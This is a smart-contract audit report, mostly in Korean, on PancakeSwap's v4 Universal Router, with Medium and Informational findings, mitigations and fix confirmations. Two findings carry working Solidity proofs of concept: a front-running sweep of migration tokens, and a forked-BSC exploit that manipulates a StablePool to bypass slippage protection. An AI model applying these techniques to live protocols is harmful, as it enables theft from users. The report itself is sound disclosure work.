**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

[Hans](https://twitter.com/hansfriese)

**Assisting Auditors**



---

# Findings
## Medium Risk


### Multi-step migration process risks token loss due to front-running

**Description:** Universal Router의 현재 구현은 V3에서 V4 포지션으로의 다단계 마이그레이션 프로세스를 허용합니다. `test_v3PositionManager_burn` 및 `test_v4CLPositionmanager_Mint` 테스트에서 볼 수 있듯이 이 프로세스는 별도의 트랜잭션에서 실행될 수 있습니다. 첫 번째 단계에서는 V3 포지션에서 토큰이 수집되어 라우터 컨트랙트에 남게 됩니다. 후속 단계에서는 이 토큰들을 사용하여 V4 포지션을 민팅합니다.

사용자 오류 등으로 인한 잘못된 마이그레이션은 프론트 러닝(front-running) 공격 벡터를 도입합니다. 이러한 단계들 사이에 토큰이 라우터 컨트랙트에 남아 있어 공격자가 마이그레이션 프로세스의 두 번째 단계를 프론트 러닝(front-run)하여 사용자의 토큰을 훔칠 수 있게 합니다.

핵심 문제는 `execute()` 함수가 각 트랜잭션 종료 시 남은 토큰을 자동으로 사용자에게 스윕(sweep)하지 않는다는 사실에서 비롯됩니다. 이로 인해 사용되지 않거나 (비)의도적으로 저장된 토큰은 외부 당사자의 무단 스윕에 취약한 상태로 남게 됩니다.

**Impact:** 마이그레이션을 별도의 단계로 수행하거나 트랜잭션 종료 시 스윕 명령을 포함하지 않은 사용자는 V3 포지션에서 수집된 모든 토큰을 잃을 위험이 있습니다.

사용자가 마이그레이션을 2단계 프로세스(V3 종료 후 V4 진입)로 자연스럽게 인식하고 단계 사이에 라우터에 토큰을 남겨두는 위험을 깨닫지 못할 수 있다는 사실이 이 영향을 악화시킵니다.

**Proof of Concept:** `V3ToV4Migration.t.sol`에 다음 테스트를 추가하십시오:

```solidity
    function test_v3PositionManager_burn_frontrunnable() public {
        vm.startPrank(alice);

        // before: verify token0/token1 balance in router
        assertEq(token0.balanceOf(address(router)), 0);
        assertEq(token1.balanceOf(address(router)), 0);

        // build up the params for (permit -> decrease -> collect)
        (,,,,,,, uint128 liqudiity,,,,) = v3Nfpm.positions(v3TokenId);
        (uint8 v, bytes32 r, bytes32 s) = _getErc721PermitSignature(address(router), v3TokenId, block.timestamp);
        IV3NonfungiblePositionManager.DecreaseLiquidityParams memory decreaseParams = IV3NonfungiblePositionManager
            .DecreaseLiquidityParams({
            tokenId: v3TokenId,
            liquidity: liqudiity,
            amount0Min: 0,
            amount1Min: 0,
            deadline: block.timestamp
        });
        IV3NonfungiblePositionManager.CollectParams memory collectParam = IV3NonfungiblePositionManager.CollectParams({
            tokenId: v3TokenId,
            recipient: address(router),
            amount0Max: type(uint128).max,
            amount1Max: type(uint128).max
        });

        // build up univeral router commands
        bytes memory commands = abi.encodePacked(
            bytes1(uint8(Commands.V3_POSITION_MANAGER_PERMIT)),
            bytes1(uint8(Commands.V3_POSITION_MANAGER_CALL)), // decrease
            bytes1(uint8(Commands.V3_POSITION_MANAGER_CALL)), // collect
            bytes1(uint8(Commands.V3_POSITION_MANAGER_CALL)) // burn
        );

        bytes[] memory inputs = new bytes[](4);
        inputs[0] = abi.encodePacked(
            IERC721Permit.permit.selector, abi.encode(address(router), v3TokenId, block.timestamp, v, r, s)
        );
        inputs[1] =
            abi.encodePacked(IV3NonfungiblePositionManager.decreaseLiquidity.selector, abi.encode(decreaseParams));
        inputs[2] = abi.encodePacked(IV3NonfungiblePositionManager.collect.selector, abi.encode(collectParam));
        inputs[3] = abi.encodePacked(IV3NonfungiblePositionManager.burn.selector, abi.encode(v3TokenId));

        snapStart("V3ToV4MigrationTest#test_v3PositionManager_burn");
        router.execute(commands, inputs);
        snapEnd();

        // after: verify token0/token1 balance in router
        assertEq(token0.balanceOf(address(router)), 9999999999999999999);
        assertEq(token1.balanceOf(address(router)), 9999999999999999999);

        // Attacker front-runs and sweeps the funds
        address attacker = makeAddr("ATTACKER");
        assertEq(token0.balanceOf(attacker), 0);
        assertEq(token1.balanceOf(attacker), 0);
        uint256 routerBalanceBeforeAttack0 = token0.balanceOf(address(router));
        uint256 routerBalanceBeforeAttack1 = token1.balanceOf(address(router));

        vm.startPrank(attacker);

        bytes memory attackerCommands = abi.encodePacked(
            bytes1(uint8(Commands.SWEEP)),
            bytes1(uint8(Commands.SWEEP))
        );

        bytes[] memory attackerInputs = new bytes[](2);
        attackerInputs[0] = abi.encode(address(token0), attacker, 0);
        attackerInputs[1] = abi.encode(address(token1), attacker, 0);

        router.execute(attackerCommands, attackerInputs);

        vm.stopPrank();

        uint256 routerBalanceAfterAttack0 = token0.balanceOf(address(router));
        uint256 routerBalanceAfterAttack1 = token1.balanceOf(address(router));

        assertEq(routerBalanceAfterAttack0, 0, "Router should have no token0 left");
        assertEq(routerBalanceAfterAttack1, 0, "Router should have no token1 left");
        assertEq(token0.balanceOf(attacker), routerBalanceBeforeAttack0);
        assertEq(token1.balanceOf(attacker), routerBalanceBeforeAttack1);
    }
```

**Recommended Mitigation:** `execute()` 호출이 끝날 때마다 자동 토큰 스윕을 구현하는 것을 고려하십시오. 라우터에 남아 있는 모든 토큰은 트랜잭션 개시자에게 반환되어야 합니다. 또는 V3 종료와 V4 진입을 단일 트랜잭션으로 결합하기 위한 도우미 함수나 명확한 지침을 제공하고/하거나 V3_POSITION_MANAGER_CALL 실행에 명확한 주석을 추가하십시오.

 **Pancake Swap**
[PR 22](https://github.com/pancakeswap/pancake-v4-universal-router/pull/22/commits/eb6898050a667611667abd859591f406131382ef)에서 수정됨

**Cyfrin:** 확인됨. 권장된 대로 V3_POSITION_MANAGER_CALL에 인라인 주석이 추가되었습니다.


### MEV Bots can bypass slippage protection in Universal Router's stable swap implementation

**Description:** Universal Router의 스테이블 스왑 기능에 있는 슬리피지 보호의 현재 구현은 우회에 취약합니다. `stableSwapExactInput` 함수는 스왑 후 출력 토큰의 잔액을 확인하여 지정된 최소 금액을 충족하는지 확인합니다. 그러나 이 확인은 라우터 컨트랙트에 미리 존재하는 출력 토큰의 잔액을 고려하지 않습니다. 다중 명령 트랜잭션 시나리오에서는 스왑이 실행되기 전에 라우터가 출력 토큰의 잔액을 가지고 있을 수 있으며, 이는 실제 스왑 출력이 지정된 최소값보다 적더라도 슬리피지 확인을 통과하게 만들 수 있습니다.

MEV 보호가 어디서 그리고 왜 손실될 수 있는지 확인하기 위해 컨트랙트를 살펴보겠습니다.

[`StableSwapRouter`](https://github.com/pancakeswap/pancake-v4-universal-router/blob/main/src/modules/pancakeswap/StableSwapRouter.sol#L68-L88)
```solidity
function stableSwapExactInput(
    address recipient,
    uint256 amountIn,
    uint256 amountOutMinimum,
    address[] calldata path,
    uint256[] calldata flag,
    address payer
) internal {
   // code....

    uint256 amountOut = tokenOut.balanceOf(address(this));
    if (amountOut < amountOutMinimum) revert StableTooLittleReceived(); //@audit this check is ineffective
    if (recipient != address(this)) pay(address(tokenOut), recipient, amountOut);
}
```

위의 확인은 라우터의 `tokenOut` 전체 잔액이 현재 스왑의 결과라고 가정하지만, 항상 그런 것은 아닙니다.

**Impact:** MEV 봇은 StablePool에서 exactIn 스왑을 할 때 사용자로부터 훔칠 수 있습니다. 최악의 경우, 사용자는 트랜잭션이 슬리피지 보호와 함께 성공적으로 실행된 것처럼 보임에도 불구하고 의도한 것보다 훨씬 적은 가치를 스왑에서 받을 수 있습니다.

**Proof of Concept:** [test/](https://github.com/pancakeswap/pancake-v4-universal-router/tree/main/test)에 새 파일을 생성하고 아래 코드를 추가하여 PoC를 실행하십시오:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import {ERC20} from "solmate/src/tokens/ERC20.sol";
// import {StableSwapTest} from "./stableSwap/StableSwap.t.sol";

import {IPermit2} from "permit2/src/interfaces/IPermit2.sol";
import {IPancakeV2Factory} from "../src/modules/pancakeswap/v2/interfaces/IPancakeV2Factory.sol";

import {IStableSwapFactory} from "../src/interfaces/IStableSwapFactory.sol";
import {IStableSwapInfo} from "../src/interfaces/IStableSwapInfo.sol";

import {UniversalRouter} from "../src/UniversalRouter.sol";
import {ActionConstants} from "pancake-v4-periphery/src/libraries/ActionConstants.sol";
import {Constants} from "../src/libraries/Constants.sol";
import {Commands} from "../src/libraries/Commands.sol";
import {RouterParameters} from "../src/base/RouterImmutables.sol";

contract Exploit is Test {
  ERC20 constant USDC = ERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
  ERC20 constant BUSDC = ERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
  ERC20 constant CAKE = ERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
  ERC20 constant WETH9 = ERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

  IPancakeV2Factory constant FACTORY = IPancakeV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
  IPermit2 constant PERMIT2 = IPermit2(0x31c2F6fcFf4F8759b3Bd5Bf0e1084A055615c768);

  IStableSwapFactory STABLE_FACTORY = IStableSwapFactory(0x25a55f9f2279A54951133D503490342b50E5cd15);
  IStableSwapInfo STABLE_INFO = IStableSwapInfo(0x150c8AbEB487137acCC541925408e73b92F39A50);

  address helperUser = vm.addr(999);
  address user = vm.addr(1234);
  address attacker = vm.addr(1111);

  UniversalRouter public router;

  uint256 WETH_AMOUNT;
  uint256 CAKE_AMOUNT;

  uint256 ATTACKER_BUSDC_AMOUNT = 10_000_000e18;

  function setUp() public {
        // BSC: May-09-2024 03:05:23 AM +UTC
        vm.createSelectFork(vm.envString("FORK_URL"), 38560000);
        // setUpTokens();

        RouterParameters memory params = RouterParameters({
            permit2: address(PERMIT2),
            weth9: address(WETH9),
            v2Factory: address(FACTORY),
            v3Factory: address(0),
            v3Deployer: address(0),
            v2InitCodeHash: bytes32(0x00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5),
            v3InitCodeHash: bytes32(0),
            stableFactory: address(STABLE_FACTORY),
            stableInfo: address(STABLE_INFO),
            v4Vault: address(0),
            v4ClPoolManager: address(0),
            v4BinPoolManager: address(0),
            v3NFTPositionManager: address(0),
            v4ClPositionManager: address(0),
            v4BinPositionManager: address(0)
        });
        router = new UniversalRouter(params);

        if (FACTORY.getPair(address(WETH9), address(USDC)) == address(0)) {
            revert("v2Pair doesn't exist");
        }

        if (FACTORY.getPair(address(CAKE), address(BUSDC)) == address(0)) {
            revert("v2Pair doesn't exist");
        }

        if (STABLE_FACTORY.getPairInfo(address(USDC), address(BUSDC)).swapContract == address(0)) {
            revert("StablePair doesn't exist");
        }

        WETH_AMOUNT = 1e18;
        CAKE_AMOUNT = 250e18;

        {
          vm.startPrank(helperUser);
          deal(address(WETH9), helperUser, WETH_AMOUNT);
          deal(address(CAKE), helperUser, CAKE_AMOUNT);
          ERC20(address(WETH9)).approve(address(PERMIT2), type(uint256).max);
          ERC20(address(CAKE)).approve(address(PERMIT2), type(uint256).max);
          ERC20(address(USDC)).approve(address(PERMIT2), type(uint256).max);
          PERMIT2.approve(address(WETH9), address(router), type(uint160).max, type(uint48).max);
          PERMIT2.approve(address(CAKE), address(router), type(uint160).max, type(uint48).max);
          PERMIT2.approve(address(USDC), address(router), type(uint160).max, type(uint48).max);
          vm.stopPrank();
        }

        {
          vm.startPrank(user);
          deal(address(WETH9), user, WETH_AMOUNT);
          deal(address(CAKE), user, CAKE_AMOUNT);
          ERC20(address(WETH9)).approve(address(PERMIT2), type(uint256).max);
          ERC20(address(CAKE)).approve(address(PERMIT2), type(uint256).max);
          PERMIT2.approve(address(WETH9), address(router), type(uint160).max, type(uint48).max);
          PERMIT2.approve(address(CAKE), address(router), type(uint160).max, type(uint48).max);
          vm.stopPrank();
        }

        {
          vm.startPrank(attacker);
          //@audit => Attacker got 10 million USDC to manipulate the rate on the USDC/BUSDC StablePool!
          deal(address(USDC), attacker, ATTACKER_BUSDC_AMOUNT);
          ERC20(address(USDC)).approve(address(PERMIT2), type(uint256).max);
          PERMIT2.approve(address(USDC), address(router), type(uint160).max, type(uint48).max);
          vm.stopPrank();
        }
    }

    function test_happyPathWithoutAbusingBug() public {
      (address[] memory pathSwap1, address[] memory pathSwap2, address[] memory stableSwapPath, uint256[] memory pairFlag) = _helperFunction();

      //Ratio of Conversion:
        //1 WBNB ~ 595.2e18 USDC
        //1 CAKE ~ 2.66 BUSDC
        //1 USDC ~ 0.99989 BUSDC

      (uint256 weth_usdc_ratio, uint256 cake_busdc_ratio, uint256 usdc_busdc_ratio) = _computeConvertionRatios(pathSwap1, pathSwap2, stableSwapPath, pairFlag);

      //@audit => Do the user's swap!

      bytes[] memory inputsUser = new bytes[](3);
      //@audit => swap 1 WBNB for USDC and leave the USDC on the router to do smth with them
        // @audit => Should get ~590 USDC
      inputsUser[0] = abi.encode(ActionConstants.ADDRESS_THIS, WETH_AMOUNT, 0, pathSwap1, true);

      //@audit => swap 250 CAKE for BUSDC and leave the BUSDC on the router to do smth with them
        // @audit => Should get ~520 BUSDC
      inputsUser[1] = abi.encode(ActionConstants.ADDRESS_THIS, CAKE_AMOUNT, 0, pathSwap2, true);

      //@audit => Do a StableSwap of USDC to BUSDC using the USDC received on the first swap!
        // @audit => In the end, the Router should have at least 1250 BUSDC after all the swaps are completed
      inputsUser[2] = abi.encode(ActionConstants.ADDRESS_THIS, ActionConstants.CONTRACT_BALANCE, 0, stableSwapPath, pairFlag, false);

      bytes memory commandsUser = abi.encodePacked(bytes1(uint8(Commands.V2_SWAP_EXACT_IN)), bytes1(uint8(Commands.V2_SWAP_EXACT_IN)), bytes1(uint8(Commands.STABLE_SWAP_EXACT_IN)));
      vm.prank(user);
      router.execute(commandsUser, inputsUser);

      uint256 busdcReceived = BUSDC.balanceOf(address(router));
      assert(busdcReceived > 1250e18);
      console.log("busdcReceived:" , busdcReceived);

    }


    function test_explotingLackOfMevProtection() public {
      (address[] memory pathSwap1, address[] memory pathSwap2, address[] memory stableSwapPath, uint256[] memory pairFlag) = _helperFunction();

      //Ratio of Conversion:
        //1 WBNB ~ 595.2e18 USDC
        //1 CAKE ~ 2.66 BUSDC
        //1 USDC ~ 0.99989 BUSDC

      (uint256 weth_usdc_ratio, uint256 cake_busdc_ratio, uint256 usdc_busdc_ratio) = _computeConvertionRatios(pathSwap1, pathSwap2, stableSwapPath, pairFlag);

      //@audit => Attacker frontruns the users tx and manipulates the rate on the USDC/BUSDC StablePool!
      bytes[] memory inputsAttacker = new bytes[](1);
      inputsAttacker[0] = abi.encode(ActionConstants.MSG_SENDER, ATTACKER_BUSDC_AMOUNT, 0, stableSwapPath, pairFlag, true);

      bytes memory commandsSttacker = abi.encodePacked(bytes1(uint8(Commands.STABLE_SWAP_EXACT_IN)));
      vm.prank(attacker);
      router.execute(commandsSttacker, inputsAttacker);

      uint256 busdcAttackerReceived = BUSDC.balanceOf(address(attacker));
      console.log("Attacker busdcReceived:" , busdcAttackerReceived);

      //@audit => Do the user swap
      bytes[] memory inputsUser = new bytes[](3);
      //@audit => swap 1 WBNB for USDC and leave the USDC on the router to do smth with them
        // @audit => Should get ~590 USDC
      inputsUser[0] = abi.encode(ActionConstants.ADDRESS_THIS, WETH_AMOUNT, 0, pathSwap1, true);

      //@audit => swap 250 CAKE for BUSDC and leave the BUSDC on the router to do smth with them
        // @audit => Should get ~660 BUSDC
      inputsUser[1] = abi.encode(ActionConstants.ADDRESS_THIS, CAKE_AMOUNT, 0, pathSwap2, true);

      //@audit => Users sets a minimum amount of BUSDC to receive for the USDC of the first swap. (At least a 90%!)
        //@audit => The user is explicitly setting the minimum amount of BUSDC to receive as ~530 BUSDC!
      //@audit => Because of the bug, the minimum amount of BUSDC the user is willing to receive will be ignored!
      uint256 busdc_amountOutMinimum = (((weth_usdc_ratio * usdc_busdc_ratio / 1e18) * 9) / 10);

      //@audit => Do a StableSwap of USDC to BUSDC using the USDC received on the first swap!
        // @audit => In the end, the Router should have at least 1250 BUSDC after all the swaps are completed
      inputsUser[2] = abi.encode(ActionConstants.ADDRESS_THIS, ActionConstants.CONTRACT_BALANCE, busdc_amountOutMinimum, stableSwapPath, pairFlag, false);

      bytes memory commandsUser = abi.encodePacked(bytes1(uint8(Commands.V2_SWAP_EXACT_IN)), bytes1(uint8(Commands.V2_SWAP_EXACT_IN)), bytes1(uint8(Commands.STABLE_SWAP_EXACT_IN)));
      vm.prank(user);
      router.execute(commandsUser, inputsUser);

      //@audit => The router only has ~660 BUSDC after swapping 1 WBNB and 250 CAKE
        //@audit => Even though the user specified a minimum amount when swapping the USDC that was received on the first swap, because of the bug, such protection is ignored.
      uint256 busdcReceived = BUSDC.balanceOf(address(router));
      assert(busdcReceived < 675e18);
      console.log("busdcReceived:" , busdcReceived);

      //@audit => Results: The user swapped 1 WBNB and 250 CAKE worth ~1250 USD, and in reality it only received less than 675 USD.
      //@audit => The attacker manipulated the ratio on the StablePool which allows him to steal on the swap of USDC ==> BUSDC
    }

    function _helperFunction() internal returns(address[] memory pathSwap1, address[] memory pathSwap2, address[] memory stableSwapPath, uint256[] memory pairFlag) {
      pathSwap1 = new address[](2);     // WBNB => USDC
      pathSwap1[0] = address(WETH9);
      pathSwap1[1] = address(USDC);

      pathSwap2 = new address[](2);     // CAKE => BUSDC
      pathSwap2[0] = address(CAKE);
      pathSwap2[1] = address(BUSDC);

      stableSwapPath = new address[](2); // USDC => BUSDC
      stableSwapPath[0] = address(USDC);
      stableSwapPath[1] = address(BUSDC);
      pairFlag = new uint256[](1);
      pairFlag[0] = 2; // 2 is the flag to indicate StableSwapTwoPool
    }

    function _computeConvertionRatios(address[] memory pathSwap1, address[] memory pathSwap2, address[] memory stableSwapPath, uint256[] memory pairFlag) internal
    returns (uint256 weth_usdc_ratio, uint256 cake_busdc_ratio, uint256 usdc_busdc_ratio) {
        bytes[] memory inputsHelperUser = new bytes[](2);
        //@audit => swap 1 WBNB for USDC to get an approximate of the current conversion between WBNB to USDC
        inputsHelperUser[0] = abi.encode(ActionConstants.MSG_SENDER, 1e18, 0, pathSwap1, true);
        //@audit => swap 1 CAKE for BUSDC to get an approximate of the current conversion between CAKE to BUSDC
        inputsHelperUser[1] = abi.encode(ActionConstants.MSG_SENDER, 1e18, 0, pathSwap2, true);

        bytes memory commandsHelperUser = abi.encodePacked(bytes1(uint8(Commands.V2_SWAP_EXACT_IN)), bytes1(uint8(Commands.V2_SWAP_EXACT_IN)));
        vm.prank(helperUser);
        router.execute(commandsHelperUser, inputsHelperUser);

        weth_usdc_ratio = USDC.balanceOf(address(helperUser));
        cake_busdc_ratio = BUSDC.balanceOf(address(helperUser));
        console.log("Convertion between WBNB to USDC:" , weth_usdc_ratio);
        console.log("Convertion between CAKE to BUSDC:" , cake_busdc_ratio);

        uint256 usdcUserHelperBalance = USDC.balanceOf(address(helperUser));
        uint256 busdcUserHelperBalanceBeforeStableSwap = BUSDC.balanceOf(address(helperUser));
        bytes[] memory inputsStableSwapHelperUser = new bytes[](1);
        //@audit => swap USDC for 1 BUSDC to get an approximate of the current conversion between USDC to BUSDC
        inputsStableSwapHelperUser[0] = abi.encode(ActionConstants.MSG_SENDER, 1e18, 0, stableSwapPath, pairFlag, true);

        bytes memory commandsStableSwapHelperUser = abi.encodePacked(bytes1(uint8(Commands.STABLE_SWAP_EXACT_IN)));
        vm.prank(helperUser);
        router.execute(commandsStableSwapHelperUser, inputsStableSwapHelperUser);

        usdc_busdc_ratio = BUSDC.balanceOf(address(helperUser)) - busdcUserHelperBalanceBeforeStableSwap;
        console.log("Convertion between USDC to BUSDC:" , usdc_busdc_ratio);
    }
}
```

위 PoC에는 두 가지 테스트가 있습니다.
- 첫 번째 테스트 (`test_happyPathWithoutAbusingBug`)는 사용자가 1 WBNB와 250 CAKE를 스왑할 때 받아야 하는 tokenOut(BUSDC)의 양을 보여줍니다.
    - 총계로 사용자는 1250 BUSDC 이상을 받아야 합니다.

- 두 번째 테스트 (`test_explotingLackOfMevProtection`)는 공격자가 StablePool에서 스왑할 때 사용자로부터 어떻게 훔칠 수 있는지 보여줍니다.
    - 사용자는 1 WBNB와 250 CAKE를 스왑하는 데 675 BUSDC 미만을 받습니다 (첫 번째 테스트와 동일).

다음 명령으로 테스트를 실행하십시오:
- Test1: `forge test --match-test test_happyPathWithoutAbusingBug -vvvv`
- Test2: `forge test --match-test test_explotingLackOfMevProtection -vvvv`

**Recommended Mitigation:** 스테이블 스왑을 수행하기 전에 라우터가 보유하고 있는 tokenOut의 잔액을 확인하고, 스왑이 완료된 후의 잔액과 비교하는 것을 고려하십시오. 차이를 계산하고 그 차이가 해당 스왑에서 받을 지정된 `amountOutMinimum` 이상인지 검증하십시오.

 **Pancake Swap**
[PR 22](https://github.com/pancakeswap/pancake-v4-universal-router/pull/22/commits/0d4e1e9c61232edede18d07dde574954f20a064a#diff-4db526cf07a2465a36dea10866e1b87c8dc08ab7af4804b87e90a4cbd66c092a)에서 수정됨

**Cyfrin:** 확인됨. 권장된 대로 수정되었습니다.

\clearpage
## Informational


### Incorrect test setup in StableSwap.t.sol

**Description:** `StableSwap.t.sol`은 payer가 라우터 컨트랙트 자체인 테스트를 포함하고 있습니다. 이러한 모든 경우에 `payerIsUser`가 잘못되어 `true`로 설정되어 있습니다. 잘못된 설정에도 불구하고 테스트 컨트랙트가 `token0`과 `token1`의 충분한 잔액을 가지고 있기 때문에 이러한 테스트는 통과합니다.

**Recommended Mitigation:** 다음 테스트에서 `payerIsUser` 플래그를 false로 업데이트하는 것을 고려하십시오:
`test_stableSwap_exactInput0For1FromRouter`
`test_stableSwap_exactInput1For0FromRouter`
`test_stableSwap_exactOutput0For1FromRouter`
`test_stableSwap_exactOutput1For0FromRouter`

**Pancake Swap**
[PR 22](https://github.com/pancakeswap/pancake-v4-universal-router/pull/22/commits/f8c2797af283e35002fc3d8cb0c97b453348a8f1)에서 수정됨

**Cyfrin:** 확인됨. 권장된 대로 수정되었습니다.


### Incorrect configuration of `StableInfo` contract address in BSC Testnet

**Description:** BSC 테스트넷 배포를 위해, `StableFactory` 및 `StableInfo` 컨트랙트 모두에 대한 라우터 설정 매개변수가 동일한 주소인 0xe6A00f8b819244e8Ab9Ea930e46449C2F20B6609를 사용하도록 구성되어 있습니다. 이들은 일반적으로 별개의 주소를 가진 별도의 컨트랙트여야 하므로 이는 실수일 가능성이 높습니다.

**Recommended Mitigation:** `StableInfo` 컨트랙트에 대해 올바른 배포 주소를 사용하는 것을 고려하십시오.

**Pancake Swap**
[PR 22](https://github.com/pancakeswap/pancake-v4-universal-router/pull/22/commits/2d02a0afeeb1b8facd17e376aeb7f4326bb1be68)에서 수정됨

**Cyfrin:** 확인됨.


### When executing multiple commands, StablePool `exactOutput` swaps may fail for ERC20 tokens with self-transfer restrictions

**Description:** StablePools에서의 다단계 스왑은 자체 전송(self-transfers)을 허용하지 않는 토큰에 대해 전체 트랜잭션을 되돌릴(revert) 수 있습니다.

`payer`가 라우터(`address(this)`)로 설정된 경우(예: 다단계 스왑을 수행하고 라우터가 이미 스왑을 위한 `tokenIn`을 가지고 있는 경우) StablePool에서 exactOutput을 스왑하면 자체 전송 시 되돌려지는 토큰에 대해 트랜잭션이 실패할 수 있습니다.

**Recommended Mitigation:** `payer == address(this)`일 때 자체 전송을 건너뛰는 것을 고려하십시오.

```solidity
function stableSwapExactOutput(
    ...
) internal {


-   payOrPermit2Transfer(path[0], payer, address(this), amountIn);
+  if (payer != address(this)) payOrPermit2Transfer(path[0], payer, address(this), amountIn);

    ...
}
```

**Pancake Swap**
인지됨.

**Cyfrin:** 인지됨.

\clearpage
